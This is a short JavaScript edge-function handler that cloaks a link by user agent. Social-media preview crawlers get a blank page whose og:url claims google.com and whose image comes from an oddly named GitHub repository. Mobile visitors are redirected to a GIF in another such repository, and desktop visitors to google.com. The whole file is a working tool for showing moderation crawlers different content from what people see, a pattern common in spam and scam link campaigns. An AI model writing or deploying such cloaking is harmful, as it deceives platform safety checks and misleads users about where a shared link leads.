
export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <meta property="og:title" content="">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://raw.githubusercontent.com/sahijasaksena-wq/frgrgh/7270c99a00419e816996dde78f35560066ae8b83/7644337502586255260.jpg">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://raw.githubusercontent.com/sahijasaksena-wq/-cfbfhb/2f0583720fd023459eaf98b981b0cc71944abdd8/8164904165089566369.gif", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
